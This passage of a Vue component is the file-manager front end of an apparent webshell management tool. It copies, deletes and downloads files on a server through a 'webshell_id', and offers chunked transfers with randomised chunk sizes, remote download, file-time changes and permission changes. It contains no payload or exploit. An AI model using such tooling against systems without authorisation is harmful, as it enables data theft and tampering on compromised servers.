      : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + newFileName
  }

  try {
    // 显示复制对话框
    const { value: destPath } = await ElMessageBox.prompt(
      `复制文件: ${selectedFile.name}`,
      '复制文件',
      {
        confirmButtonText: '复制',
        cancelButtonText: '取消',
        inputValue: defaultDestPath,
        inputPattern: /^.+$/,
        inputErrorMessage: '目标路径不能为空',
      },
    )

    if (!destPath || destPath === sourcePath) {
      ElMessage.warning('目标路径不能为空或与源路径相同')
      return
    }

    // 显示复制进度
    const loadingMessage = ElMessage({
      message: '正在复制文件...',
      type: 'info',
      duration: 0,
    })

    // 调用后端API
    const response = await shellApi.value.copyFile({
      webshell_id: props.currentWebshell.id,
      srcFileName: sourcePath,
      destFileName: destPath,
    })

    loadingMessage.close()

    if (response.data.status === 'success') {
      ElMessage.success(`文件复制成功: ${selectedFile.name}`)
      selectedFiles.value = []
      loadFileList(currentPath.value)
    } else {
      ElMessage.error(`文件复制失败: ${response.data.message}`)
    }
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消复制操作')
    } else {
      console.error('复制文件失败:', error)
      ElMessage.error(`复制文件失败: ${error.response?.data?.message || error.message}`)
    }
  }
}

// 处理删除文件
const handleDeleteFiles = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  if (selectedFiles.value.length === 0) {
    ElMessage.warning('请先选择要删除的文件')
    return
  }

  try {
    // 构建文件路径列表
    const filePaths = selectedFiles.value.map((file) => {
      return isWindowsSystem()
        ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + file.name
        : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + file.name
    })

    // 显示确认删除对话框
    const fileNames = selectedFiles.value.map((file) => file.name).join(', ')
    await ElMessageBox.confirm(`确定要删除以下文件吗？\n\n${fileNames}`, '确认删除', {
      confirmButtonText: '删除',
      cancelButtonText: '取消',
      type: 'warning',
      dangerouslyUseHTMLString: false,
    })

    // 显示删除进度
    const loadingMessage = ElMessage({
      message: `正在删除 ${selectedFiles.value.length} 个文件...`,
      type: 'info',
      duration: 0,
    })

    // 逐个删除文件
    const results = []
    for (let i = 0; i < filePaths.length; i++) {
      const filePath = filePaths[i]
      const fileName = selectedFiles.value[i].name

      try {
        const response = await shellApi.value.deleteFile({
          webshell_id: props.currentWebshell.id,
          fileName: filePath,
        })

        if (response.data.status === 'success') {
          results.push({ fileName, success: true })
        } else {
          results.push({ fileName, success: false, error: response.data.message })
        }
      } catch (error) {
        results.push({
          fileName,
          success: false,
          error: error.response?.data?.message || error.message,
        })
      }
    }

    loadingMessage.close()

    // 统计结果
    const successCount = results.filter((r) => r.success).length
    const failCount = results.length - successCount

    if (failCount === 0) {
      ElMessage.success(`成功删除 ${successCount} 个文件`)
    } else if (successCount === 0) {
      ElMessage.error(`删除失败，共 ${failCount} 个文件`)
    } else {
      ElMessage.warning(`删除完成：成功 ${successCount} 个，失败 ${failCount} 个`)
    }

    // 清空选择并刷新列表
    selectedFiles.value = []
    loadFileList(currentPath.value)
  } catch (error) {
    if (error === 'cancel') {
      console.log('用户取消删除操作')
    } else {
      console.error('删除文件失败:', error)
      ElMessage.error(`删除文件失败: ${error.message}`)
    }
  }
}

// 处理下载文件
const handleDownloadFiles = async () => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  if (selectedFiles.value.length === 0) {
    ElMessage.warning('请先选择要下载的文件')
    return
  }

  // 过滤掉目录，只下载文件
  const filesToDownload = selectedFiles.value.filter((file) => !file.isDirectory)

  if (filesToDownload.length === 0) {
    ElMessage.warning('请选择文件进行下载，不支持下载目录')
    return
  }

  if (filesToDownload.length > 5) {
    ElMessage.warning('一次最多只能下载5个文件')
    return
  }

  // 显示下载方式选择对话框
  try {
    const downloadConfig = await showDownloadMethodDialog(filesToDownload)
    if (!downloadConfig) {
      return // 用户取消
    }

    const { method, chunkSize } = downloadConfig

    // 重置下载状态
    downloadCancelled = false
    downloadProgressVisible.value = true
    updateDownloadStatus(0, filesToDownload.length, '准备下载...', '准备下载文件...')

    const results = []

    // 逐个下载文件
    for (let i = 0; i < filesToDownload.length; i++) {
      // 检查是否取消下载
      if (downloadCancelled) {
        break
      }

      let filePath = isWindowsSystem()
        ? currentPath.value +
          (currentPath.value.endsWith('\\') ? '' : '\\') +
          filesToDownload[i].name
        : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + filesToDownload[i].name

      console.log(`[DEBUG] 开始下载文件: ${filesToDownload[i].name}`)
      console.log(`[DEBUG] 下载模式: ${method}`)
      if (method === 'big') {
        console.log(`[DEBUG] 块大小: ${chunkSize}KB`)
      }

      try {
        // 判断是否使用大文件下载
        const useBigDownload = method === 'big'

        let response
        if (useBigDownload) {
          // 大文件下载，使用全局配置参数
          const { chunkSize, timeoutSeconds, enableChunkSizeVariation, chunkSizeVariationKb } =
            downloadConfig

          // 计算实际块大小（可能包含随机浮动）
          const actualChunkSize = calculateRandomDownloadChunkSize(
            chunkSize,
            enableChunkSizeVariation,
            chunkSizeVariationKb,
          )

          const downloadParams = {
            webshell_id: props.currentWebshell.id,
            fileName: filePath,
            useBigDownload: true,
            chunkKbSize: actualChunkSize,
            timeoutSeconds: timeoutSeconds,
            enableChunkSizeVariation: enableChunkSizeVariation,
            chunkSizeVariationKb: chunkSizeVariationKb,
          }

          // 显示下载状态
          updateDownloadStatus(
            i + 1,
            filesToDownload.length,
            filesToDownload[i].name,
            `正在下载大文件: ${filesToDownload[i].name} (${actualChunkSize}KB块${enableChunkSizeVariation ? ` ±${chunkSizeVariationKb}KB浮动` : ''})...`,
          )

          console.log(`[DEBUG] 大文件下载参数:`, downloadParams)

          response = await shellApi.value.downloadLargeFile(downloadParams)
        } else {
          // 显示普通下载状态
          updateDownloadStatus(
            i + 1,
            filesToDownload.length,
            filesToDownload[i].name,
            `正在下载文件: ${filesToDownload[i].name}...`,
          )

          // 文件下载
          response = await shellApi.value.downloadFile({
            webshell_id: props.currentWebshell.id,
            fileName: filePath,
            useBigDownload: false,
          })
        }

        // 检查是否取消下载
        if (downloadCancelled) {
          break
        }

        if (response.data.status === 'success') {
          const fileContent = response.data.data.content
          const contentType = response.data.data.contentType
          const downloadMode = response.data.data.downloadMode

          // 检查文件内容是否为空或包含错误信息
          if (!fileContent) {
            results.push({
              fileName: filesToDownload[i].name,
              success: false,
              error: '文件内容为空',
            })
            console.log(`[DEBUG] 文件内容为空: ${filesToDownload[i].name}`)
            continue
          }

          // 创建下载链接
          let blob
          if (contentType === 'binary') {
            // 二进制文件，需要先解码base64
            try {
              console.log(
                `[DEBUG] 处理二进制文件: ${filesToDownload[i].name} (${downloadMode}模式)`,
              )
              const binaryString = atob(fileContent) // 解码base64
              const bytes = new Uint8Array(binaryString.length)
              for (let j = 0; j < binaryString.length; j++) {
                bytes[j] = binaryString.charCodeAt(j)
              }
              blob = new Blob([bytes], { type: 'application/octet-stream' })
              console.log(`[DEBUG] 二进制文件解码成功，大小: ${bytes.length} bytes`)
            } catch (error) {
              console.error(`[ERROR] 二进制文件解码失败: ${error}`)
              results.push({
                fileName: filesToDownload[i].name,
                success: false,
                error: '二进制文件解码失败',
              })
              continue
            }
          } else {
            // 文本文件
            console.log(`[DEBUG] 处理文本文件: ${filesToDownload[i].name} (${downloadMode}模式)`)
            blob = new Blob([fileContent], { type: 'text/plain' })
          }

          const downloadUrl = window.URL.createObjectURL(blob)

          // 创建临时下载链接并触发下载
          const link = document.createElement('a')
          link.href = downloadUrl
          link.download = filesToDownload[i].name
          document.body.appendChild(link)
          link.click()
          document.body.removeChild(link)

          // 释放URL对象
          window.URL.revokeObjectURL(downloadUrl)

          results.push({
            fileName: filesToDownload[i].name,
            success: true,
            mode: downloadMode,
          })
          console.log(`[DEBUG] 文件下载成功: ${filesToDownload[i].name} (${downloadMode}模式)`)
        } else {
          results.push({
            fileName: filesToDownload[i].name,
            success: false,
            error: response.data.message,
          })
          console.log(
            `[DEBUG] 文件下载失败: ${filesToDownload[i].name}, 错误: ${response.data.message}`,
          )
        }
      } catch (error) {
        results.push({
          fileName: filesToDownload[i].name,
          success: false,
          error: error.response?.data?.message || error.message,
        })
        console.error(`[ERROR] 下载文件失败: ${filesToDownload[i].name}`, error)
      }

      // 更新完成状态
      if (!downloadCancelled) {
        updateDownloadStatus(
          i + 1,
          filesToDownload.length,
          filesToDownload[i].name,
          `文件下载完成: ${filesToDownload[i].name}`,
        )
      }
    }

    // 关闭进度对话框
    downloadProgressVisible.value = false

    // 如果没有取消，显示结果
    if (!downloadCancelled) {
      // 统计结果
      const successCount = results.filter((r) => r.success).length
      const failCount = results.length - successCount

      if (failCount === 0) {
        const normalCount = results.filter((r) => r.success && r.mode === 'normal').length
        const bigCount = results.filter((r) => r.success && r.mode === 'big').length
        let message = `成功下载 ${successCount} 个文件`
        if (bigCount > 0) {
          message += `（普通下载: ${normalCount}个，大文件下载: ${bigCount}个）`
        }
        ElMessage.success(message)
      } else if (successCount === 0) {
        ElMessage.error(`下载失败，共 ${failCount} 个文件`)
        // 显示详细错误信息
        const errorMessages = results
          .filter((r) => !r.success)
          .map((r) => `${r.fileName}: ${r.error}`)
          .join('\n')
        console.error('下载错误详情:\n', errorMessages)
      } else {
        ElMessage.warning(`下载完成：成功 ${successCount} 个，失败 ${failCount} 个`)
      }
    }

    // 清空选择
    selectedFiles.value = []
  } catch (error) {
    downloadProgressVisible.value = false
    console.error('下载文件失败:', error)
    ElMessage.error(`下载文件失败: ${error.message}`)
  }
}

// 显示下载方式选择对话框
const showDownloadMethodDialog = (filesToDownload) => {
  return new Promise((resolve) => {
    // 获取全局下载配置
    const globalDownloadConfig = getGlobalDownloadConfig()

    // 计算文件总大小
    const totalSize = filesToDownload.reduce((sum, file) => sum + (file.size || 0), 0)
    const totalSizeFormatted = formatFileSize(totalSize)

    // 根据全局配置判断是否建议使用大文件下载
    const suggestBigDownload = totalSize > globalDownloadConfig.autoSwitchSize * 1024 * 1024

    ElMessageBox.confirm(
      `即将下载 ${filesToDownload.length} 个文件，总大小约 ${totalSizeFormatted}\n\n请选择下载方式：\n\n大文件下载将使用全局配置参数：\n• 块大小: ${globalDownloadConfig.chunkKbSize}KB${globalDownloadConfig.enableChunkSizeVariation ? ` (浮动范围: ±${globalDownloadConfig.chunkSizeVariationKb}KB)` : ''}\n• 请求间隔: ${globalDownloadConfig.timeoutSeconds}秒`,
      '选择下载方式',
      {
        confirmButtonText: '大文件下载',
        cancelButtonText: '普通下载',
        distinguishCancelAndClose: true,
        type: suggestBigDownload ? 'warning' : 'question',
        message: suggestBigDownload ? '建议使用大文件下载，可提供进度显示和稳定传输' : undefined,
      },
    )
      .then(() => {
        // 用户选择大文件下载，直接使用全局配置参数
        console.log('[DEBUG] 使用全局配置进行大文件下载:', globalDownloadConfig)

        // 显示使用全局配置的提示
        ElMessage.info({
          message: `使用全局配置参数：${globalDownloadConfig.chunkKbSize}KB块${globalDownloadConfig.enableChunkSizeVariation ? ` (±${globalDownloadConfig.chunkSizeVariationKb}KB浮动)` : ''}，${globalDownloadConfig.timeoutSeconds}s间隔`,
          duration: 4000,
        })

        resolve({
          method: 'big',
          chunkSize: globalDownloadConfig.chunkKbSize,
          timeoutSeconds: globalDownloadConfig.timeoutSeconds,
          enableChunkSizeVariation: globalDownloadConfig.enableChunkSizeVariation,
          chunkSizeVariationKb: globalDownloadConfig.chunkSizeVariationKb,
        })
      })
      .catch((action) => {
        if (action === 'cancel') {
          // 用户选择普通下载
          resolve({ method: 'normal', chunkSize: null })
        } else {
          // 用户关闭对话框
          resolve(null)
        }
      })
  })
}

// 获取全局上传配置
const getGlobalUploadConfig = () => {
  try {
    const saved = localStorage.getItem('webshell_upload_config')
    if (saved) {
      const config = JSON.parse(saved)
      return {
        chunkMbSize: config.chunkMbSize || 1.0,
        delaySeconds: config.delaySeconds || 0.5,
        maxRetries: config.maxRetries || 5,
        autoSwitchSize: config.autoSwitchSize || 10,
        enableChunkSizeVariation: config.enableChunkSizeVariation || false,
        chunkSizeVariationMb: config.chunkSizeVariationMb || 0.2,
      }
    }
  } catch (error) {
    console.error('[CONFIG] 读取全局上传配置失败:', error)
  }

  // 返回默认配置
  return {
    chunkMbSize: 1.0,
    delaySeconds: 0.5,
    maxRetries: 5,
    autoSwitchSize: 10,
    enableChunkSizeVariation: false,
    chunkSizeVariationMb: 0.2,
  }
}

// 获取全局下载配置
const getGlobalDownloadConfig = () => {
  try {
    const saved = localStorage.getItem('webshell_download_config')
    if (saved) {
      const config = JSON.parse(saved)
      return {
        chunkKbSize: config.chunkKbSize || 512,
        timeoutSeconds: config.timeoutSeconds || 1.0,
        enableChunkSizeVariation: config.enableChunkSizeVariation || false,
        chunkSizeVariationKb: config.chunkSizeVariationKb || 128,
        autoSwitchSize: config.autoSwitchSize || 50,
      }
    }
  } catch (error) {
    console.error('[CONFIG] 读取全局下载配置失败:', error)
  }

  // 返回默认配置
  return {
    chunkKbSize: 512,
    timeoutSeconds: 1.0,
    enableChunkSizeVariation: false,
    chunkSizeVariationKb: 128,
    autoSwitchSize: 50,
  }
}

// 计算随机块大小（上传用，MB单位）
const calculateRandomChunkSize = (baseSizeMb, enableVariation, variationMb) => {
  if (!enableVariation || variationMb <= 0) {
    return baseSizeMb
  }

  // 计算最小和最大块大小
  const minSize = Math.max(0.01, baseSizeMb - variationMb) // 最小不低于0.01MB
  const maxSize = baseSizeMb + variationMb

  // 生成随机块大小
  const randomSize = minSize + Math.random() * (maxSize - minSize)

  // 保留两位小数
  return Math.round(randomSize * 100) / 100
}

// 计算随机块大小（下载用，KB单位）
const calculateRandomDownloadChunkSize = (baseSizeKb, enableVariation, variationKb) => {
  if (!enableVariation || variationKb <= 0) {
    return baseSizeKb
  }

  // 计算最小和最大块大小
  const minSize = Math.max(8, baseSizeKb - variationKb) // 最小不低于8KB
  const maxSize = baseSizeKb + variationKb

  // 生成随机块大小
  const randomSize = minSize + Math.random() * (maxSize - minSize)

  // 四舍五入到整数KB
  return Math.round(randomSize)
}

// 显示上传方式选择对话框
const showUploadMethodDialog = (file) => {
  return new Promise((resolve) => {
    // 获取全局配置
    const globalConfig = getGlobalUploadConfig()

    // 计算文件大小
    const fileSize = file.size
    const fileSizeFormatted = formatFileSize(fileSize)

    // 根据全局配置判断是否建议使用大文件上传
    const suggestBigUpload = fileSize > globalConfig.autoSwitchSize * 1024 * 1024

    ElMessageBox.confirm(
      `文件大小: ${fileSizeFormatted}\n\n请选择上传方式：\n\n大文件上传将使用全局配置参数：\n• 块大小: ${globalConfig.chunkMbSize}MB${globalConfig.enableChunkSizeVariation ? ` (浮动范围: ±${globalConfig.chunkSizeVariationMb}MB)` : ''}\n• 延迟时间: ${globalConfig.delaySeconds}秒\n• 重试次数: ${globalConfig.maxRetries}次`,
      '选择上传方式',
      {
        confirmButtonText: '大文件上传',
        cancelButtonText: '普通上传',
        distinguishCancelAndClose: true,
        type: suggestBigUpload ? 'warning' : 'question',
        message: suggestBigUpload ? '建议使用大文件上传，可提供进度显示和断点续传' : undefined,
      },
    )
      .then(() => {
        // 用户选择大文件上传，直接使用全局配置参数
        console.log('[DEBUG] 使用全局配置进行大文件上传:', globalConfig)

        // 显示使用全局配置的提示
        ElMessage.info({
          message: `使用全局配置参数：${globalConfig.chunkMbSize}MB块${globalConfig.enableChunkSizeVariation ? ` (±${globalConfig.chunkSizeVariationMb}MB浮动)` : ''}，${globalConfig.delaySeconds}s延迟，${globalConfig.maxRetries}次重试`,
          duration: 4000,
        })

        resolve({
          method: 'big',
          chunkMbSize: globalConfig.chunkMbSize,
          delaySeconds: globalConfig.delaySeconds,
          maxRetries: globalConfig.maxRetries,
          enableChunkSizeVariation: globalConfig.enableChunkSizeVariation,
          chunkSizeVariationMb: globalConfig.chunkSizeVariationMb,
        })
      })
      .catch((action) => {
        if (action === 'cancel') {
          // 用户选择普通上传
          resolve({ method: 'normal' })
        } else {
          // 用户关闭对话框
          resolve(null)
        }
      })
  })
}

// 处理批量操作
const handleAction = (action) => {
  switch (action) {
    case 'upload':
      handleFileUpload()
      break
    case 'newItem':
      handleNewItem()
      break
    case 'move':
      handleMoveFiles()
      break
    case 'copy':
      handleCopyFiles()
      break
    case 'delete':
      handleDeleteFiles()
      break
    case 'download':
      handleDownloadFiles()
      break
    case 'zip':
      handleZipFiles()
      break
    case 'unzip':
      handleUnzipFiles()
      break
    case 'fileRemoteDownload':
      handleFileRemoteDownload()
      break
    case 'setFileTime':
      handleSetFileTime()
      break
    case 'setFilePermission':
      handleSetFilePermission()
      break
    case 'editFileContent':
      handleEditFileContent()
      break
  }
}

// 文件类型判断方法
const isTextFile = (filename) => {
  const textExtensions = [
    '.txt',
    '.log',
    '.conf',
    '.cfg',
    '.ini',
    '.xml',
    '.json',
    '.html',
    '.htm',
    '.css',
    '.js',
    '.php',
    '.py',
    '.java',
    '.cpp',
    '.c',
    '.h',
    '.sh',
    '.bat',
    '.sql',
    '.md',
    '.yml',
    '.yaml',
  ]
  return textExtensions.some((ext) => filename.toLowerCase().endsWith(ext))
}

const isImageFile = (filename) => {
  const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.webp', '.ico']
  return imageExtensions.some((ext) => filename.toLowerCase().endsWith(ext))
}

const isVideoFile = (filename) => {
  const videoExtensions = ['.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mkv', '.m4v']
  return videoExtensions.some((ext) => filename.toLowerCase().endsWith(ext))
}

// 获取文件图标样式
const getFileIconClass = (file) => {
  if (file.isDirectory) return 'folder-icon'
  if (isTextFile(file.name)) return 'text-file-icon'
  if (isImageFile(file.name)) return 'image-file-icon'
  if (isVideoFile(file.name)) return 'video-file-icon'
  return 'file-icon'
}

// 格式化文件大小
const formatFileSize = (bytes) => {
  if (bytes === 0) return '0 B'
  const k = 1024
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB']
  const i = Math.floor(Math.log(bytes) / Math.log(k))
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]
}

// 格式化文件时间
const formatFileTime = (timeString) => {
  if (!timeString) return '-'
  const date = new Date(timeString)
  return date.toLocaleString('zh-CN')
}

// 获取权限标签类型
const getPermissionTagType = (permission) => {
  if (!permission) return 'info'
  if (permission.includes('x')) return 'success'
  if (permission.includes('w')) return 'warning'
  return 'info'
}

console.log('WebshellFileManager 组件已加载 - 完整功能版本')
</script>

<style scoped>
.file-manager-panel {
  padding: 20px;
  height: 100%;
}

.file-manager-container {
  display: flex;
  height: 600px;
  gap: 15px;
  background-color: #f8f9fa;
  border-radius: 8px;
  overflow: hidden;
}

/* 左侧目录树区域 (L1) */
.directory-tree-panel {
  width: 250px;
  background-color: #fff;
  border-radius: 8px;
  border: 1px solid #e4e7ed;
  display: flex;
  flex-direction: column;
}

.tree-header {
  padding: 15px;
  border-bottom: 1px solid #e4e7ed;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.tree-title {
  font-weight: 600;
  color: #303133;
}

.tree-content {
  flex: 1;
  padding: 10px;
  overflow-y: auto;
}

.directory-tree {
  height: 100%;
}

.tree-node {
  display: flex;
  align-items: center;
  gap: 8px;
}

.tree-node-icon {
  font-size: 16px;
  color: #909399;
}

.tree-node-label {
  font-size: 14px;
  color: #606266;
}

/* 右侧内容区域 */
.file-content-panel {
  flex: 1;
  display: flex;
  flex-direction: column;
  gap: 15px;
}

/* 当前路径区域 (R1) */
.path-panel {
  background-color: #fff;
  border-radius: 8px;
  border: 1px solid #e4e7ed;
  padding: 15px;
}

.path-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 10px;
}

.path-title {
  font-weight: 600;
  color: #303133;
}

.path-input-container {
  width: 100%;
}

.path-input {
  width: 100%;
}

/* 文件列表区域 (R2) */
.file-list-panel {
  flex: 1;
  background-color: #fff;
  border-radius: 8px;
  border: 1px solid #e4e7ed;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.file-list-header {
  padding: 15px;
  border-bottom: 1px solid #e4e7ed;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.file-count {
  font-weight: 600;
  color: #303133;
}

.list-actions {
  display: flex;
  gap: 10px;
  align-items: center;
}

.file-table-container {
  flex: 1;
  overflow: hidden;
  min-height: 200px;
}

.file-grid-container {
  flex: 1;
  padding: 15px;
  overflow-y: auto;
}

.file-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
  gap: 15px;
}

.file-grid-item {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 15px;
  border-radius: 8px;
  border: 1px solid #e4e7ed;
  cursor: pointer;
  transition: all 0.2s ease;
  background-color: #fafafa;
}

.file-grid-item:hover {
  border-color: #409eff;
  background-color: #f0f9ff;
}

.file-grid-item.is-selected {
  border-color: #409eff;
  background-color: #e1f3ff;
}

.file-grid-icon {
  font-size: 32px;
  margin-bottom: 8px;
}

.file-grid-name {
  font-size: 12px;
  color: #606266;
  text-align: center;
  word-break: break-all;
  margin-bottom: 4px;
}

.file-grid-info {
  font-size: 10px;
  color: #909399;
  text-align: center;
}

/* 文件图标样式 */
.file-icon {
  font-size: 18px;
}

.folder-icon {
  color: #409eff;
}

.text-file-icon {
  color: #67c23a;
}

.image-file-icon {
  color: #e6a23c;
}

.video-file-icon {
  color: #f56c6c;
}

.file-name {
  cursor: pointer;
  color: #606266;
}

.file-name:hover {
  color: #409eff;
}

.file-name.is-directory {
  color: #409eff;
  font-weight: 500;
}

/* 功能按钮区域 (R3) */
.action-buttons-panel {
  background-color: #fff;
  border-radius: 8px;
  border: 1px solid #e4e7ed;
  padding: 15px;
}

.action-buttons {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: flex-start;
}

.action-buttons .el-button-group {
  margin-right: 10px;
}

/* 滚动条样式 */
.tree-content::-webkit-scrollbar,
.file-grid-container::-webkit-scrollbar {
  width: 6px;
}

.tree-content::-webkit-scrollbar-track,
.file-grid-container::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 3px;
}

.tree-content::-webkit-scrollbar-thumb,
.file-grid-container::-webkit-scrollbar-thumb {
  background: #c1c1c1;
  border-radius: 3px;
}

.tree-content::-webkit-scrollbar-thumb:hover,
.file-grid-container::-webkit-scrollbar-thumb:hover {
  background: #a8a8a8;
}

/* 响应式设计 */
@media (max-width: 1200px) {
  .file-manager-container {
    flex-direction: column;
    height: auto;
  }

  .directory-tree-panel {
    width: 100%;
    height: 200px;
  }

  .file-content-panel {
    height: 400px;
  }
}

@media (max-width: 768px) {
  .file-manager-panel {
    padding: 10px;
  }

  .path-header {
    flex-direction: column;
    gap: 10px;
    align-items: flex-start;
  }

  .file-list-header {
    flex-direction: column;
    gap: 10px;
    align-items: flex-start;
  }

  .action-buttons {
    flex-direction: column;
  }

  .action-buttons .el-button-group {
    width: 100%;
  }
}

/* 下载状态对话框样式 */
.download-status-content {
  padding: 20px 0;
  text-align: center;
}

.loading-animation {
  margin-bottom: 20px;
}

.loading-animation .el-icon {
  font-size: 32px;
  color: #409eff;
}

.status-info {
  margin-bottom: 10px;
}

.status-text {
  font-size: 16px;
  font-weight: 500;
  color: #303133;
  margin-bottom: 10px;
}

.file-info {
  margin-bottom: 8px;
}

.current-file {
  font-size: 14px;
  color: #606266;
  word-break: break-all;
}

.progress-stats {
  font-size: 12px;
  color: #909399;
}

/* 上传状态对话框样式 */
.upload-status-content {
  padding: 20px 0;
}

.upload-status-content .status-info {
  text-align: center;
}

.upload-status-content .status-text {
  font-size: 16px;
  font-weight: 500;
  color: #303133;
  margin-bottom: 10px;
}

.upload-status-content .file-info {
  margin-bottom: 15px;
}

.upload-status-content .current-file {
  font-size: 14px;
  color: #606266;
  word-break: break-all;
}

.progress-container {
  margin: 20px 0;
}

.progress-details {
  display: flex;
  justify-content: space-between;
  margin-top: 10px;
  font-size: 12px;
  color: #909399;
}

.chunk-progress {
  flex: 1;
  text-align: left;
}

.byte-progress {
  flex: 1;
  text-align: right;
}

:deep(.file-edit-dialog) {
  width: 95% !important;
  max-width: 1400px !important;
  min-width: 1000px !important;
}

:deep(.file-edit-dialog .el-message-box__content) {
  padding: 0 20px;
}

:deep(.file-edit-dialog .el-message-box__message) {
  margin: 0;
}

/* 文件编辑器textarea样式增强 */
:deep(.file-edit-dialog textarea) {
  transition: all 0.3s ease;
}

:deep(.file-edit-dialog textarea:focus) {
  border-color: #409eff !important;
  box-shadow: 0 0 0 2px rgba(64, 158, 255, 0.2);
  outline: none;
}

/* 响应式设计 */
@media (max-width: 768px) {
  :deep(.file-edit-dialog.el-message-box) {
    width: 95% !important;
    min-width: auto !important;
  }

  :deep(.file-edit-dialog) {
    width: 95% !important;
    min-width: auto !important;
  }

  :deep(.file-edit-dialog textarea) {
    height: 450px !important;
    font-size: 12px !important;
  }
}
</style>
